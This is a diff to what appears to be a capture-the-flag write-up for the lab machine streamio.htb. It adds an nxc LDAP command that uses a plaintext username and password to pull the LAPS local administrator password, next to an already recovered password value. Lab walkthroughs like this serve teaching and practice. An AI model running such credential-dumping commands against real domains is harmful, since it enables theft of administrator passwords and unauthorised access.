@@ -14,3 +14,9 @@ The Password can be found under "ms-Mcs-AdmPwd".
 ```
 Mm}KJq5P0%$I7U8zHP19Mk28
 ```
+
+or with nxc
+
+```
+nxc ldap streamio.htb -u 'jdgodd' -p 'JDg0dd1s@d0p3cr3@t0r' -M laps
+```
